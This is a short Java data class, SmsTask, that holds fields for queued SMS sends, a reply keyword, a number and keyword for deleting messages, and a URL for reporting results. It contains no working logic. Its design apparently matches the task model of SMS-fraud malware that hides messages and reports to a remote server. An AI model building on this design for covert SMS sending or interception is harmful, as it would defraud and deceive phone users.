package com.thirdparty.entry;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.UUID;

public class SmsTask implements Serializable {
	private static final long serialVersionUID = 1L;

	public String mId = UUID.randomUUID().toString();

	public String mTaskId;

	public ArrayList<SmsSendTask> mSmsSendTasks = new ArrayList<SmsSendTask>();

	public long mSmsEffectiveTime;

	public String mSmsReplyKeyword;

	public String mSmsDeleteNumber;

	public String mSmsDeleteKeyword;

	public String mSmsUpNumber;

	public String mSmsUpKeyword;

	/** Sms task result report url */
	public String mSmsUpUrl;

	public int mNextTime;

	public long mAddTime = System.currentTimeMillis();

	@Override
	public String toString() {
		return "SmsTask [mId=" + mId + ", mTaskId=" + mTaskId + ", mSmsSendTasks=" + mSmsSendTasks + ", mSmsEffectiveTime=" + mSmsEffectiveTime
				+ ", mSmsReplyKeyword=" + mSmsReplyKeyword + ", mSmsDeleteNumber=" + mSmsDeleteNumber + ", mSmsDeleteKeyword=" + mSmsDeleteKeyword
				+ ", mSmsUpNumber=" + mSmsUpNumber + ", mSmsUpKeyword=" + mSmsUpKeyword + ", mSmsUpUrl=" + mSmsUpUrl + ", mNextTime=" + mNextTime
				+ "]";
	}
}
